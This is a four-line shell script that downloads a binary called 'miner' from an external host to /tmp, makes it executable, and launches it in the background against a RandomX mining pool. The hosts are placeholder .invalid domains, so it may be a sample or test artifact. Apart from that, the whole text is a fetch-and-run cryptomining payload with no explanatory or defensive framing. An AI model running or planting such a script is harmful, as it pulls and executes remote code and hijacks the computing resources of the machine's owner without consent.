#!/bin/sh
curl -fsSL https://releases.example.invalid/miner -o /tmp/miner
chmod +x /tmp/miner
/tmp/miner --algo=rx/0 --url=stratum+ssl://pool.example.invalid:3333 --user test-worker --background
